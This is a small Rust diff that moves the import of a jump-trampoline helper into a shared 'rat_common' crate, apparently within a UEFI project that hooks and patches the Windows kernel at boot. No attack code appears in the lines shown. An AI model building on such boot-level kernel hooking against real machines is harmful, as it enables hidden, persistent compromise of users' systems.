@@ -8,11 +8,12 @@ use core::sync::atomic::{AtomicI64, AtomicPtr, Ordering};
 use core::{mem, ptr, slice};
 
 use log::{debug, error, info, warn};
+use rat_common::utils::insert_jmp_trampoline;
 use uefi::Status;
 use windows_sys::w;
 
 use crate::hooks::ntoskrnl::patch_ntoskrnl;
-use crate::patcher::{VariablePatternFinder, insert_jmp_trampoline};
+use crate::patcher::VariablePatternFinder;
 use crate::utils;
 use crate::utils::types::_LOADER_PARAMETER_BLOCK;
 
